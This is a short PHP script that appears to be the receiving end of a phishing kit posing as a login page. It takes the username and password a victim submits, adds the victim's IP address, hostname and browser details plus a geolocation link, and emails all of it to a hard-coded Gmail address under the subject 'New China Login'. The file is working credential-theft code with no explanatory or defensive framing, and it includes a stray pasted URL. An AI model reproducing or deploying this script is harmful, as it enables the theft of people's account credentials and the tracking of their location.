<?php
$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];	

if(!empty($_POST)) {
 $email= $_POST['Name'];
 $password = $_POST['Ps'];
 
		$to = "calvinborgman@gmail.com";
		
		https://www.apollo.io/companies/Lead-Scrape/5e566442cd6c1f00014e005e?chart=count
         $subject = "New China Login : ip";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
         $message .= "Ip           : ".$ip."\r\n";
	     $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	     $message .= "User Agent : ".$useragent."\n";
		 
		$header = "Content type: xeuztech \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>